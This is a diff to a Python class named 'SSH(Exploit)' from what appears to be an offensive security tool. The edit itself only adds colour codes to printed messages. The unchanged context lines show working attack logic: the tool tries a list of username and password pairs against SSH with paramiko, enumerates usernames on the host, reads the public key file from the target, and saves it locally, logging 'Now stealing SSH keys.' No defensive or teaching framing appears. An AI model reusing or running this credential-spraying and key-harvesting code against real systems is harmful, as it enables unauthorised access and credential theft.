@@ -27,20 +27,20 @@ class SSH(Exploit):
         try:
             stdin, stdout, stderr = ssh.exec_command('cat ~/.ssh/id_rsa.pub')
         except:
-            print(f"No SSH keys found.", file=self.output)
+            print(f"No {Color.BMAGEN}SSH{Color.END} keys found.", file=self.output)
         else:
             keys_bytes = stdout.read()
             keys = keys_bytes.decode(encoding='UTF-8')
             with open(f"./data/{ip_address}_{username}_sshkey.txt", "w") as text_file:
                 text_file.write(keys)
-            print(f"{Color.BGRN}Success.{Color.END} SSH keys saved in Data folder.", file=self.output)
+            print(f"{Color.BGRN}Success.{Color.END} {Color.BMAGEN}SSH{Color.END} keys saved in Data folder.", file=self.output)
         finally:
             stdin.close()
 
     def getloot(self, ip_address, credentials):
         # try to log into ssh using credentials
         for c in credentials:
-            print(f"Trying to SSH into IP address {ip_address} with:\n Username: {c[0]} and Password: {c[1]}", file=self.output)
+            print(f"Trying to {Color.BMAGEN}SSH{Color.END} into IP address {ip_address} with:\n Username: {c[0]} and Password: {c[1]}", file=self.output)
             ssh = paramiko.SSHClient()
             ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
             try:
@@ -52,6 +52,6 @@ class SSH(Exploit):
                 print(f'{Color.BGRN}Success.{Color.END} Now gathering all usernames.', file=self.output)
                 usernames = self.get_usernames(ssh)
                 
-                print(f'Now stealing SSH keys.', file=self.output)
+                print(f'Now stealing {Color.BMAGEN}SSH{Color.END} keys.', file=self.output)
                 self.get_sshkeys(ssh, ip_address, c[0])
                 return usernames
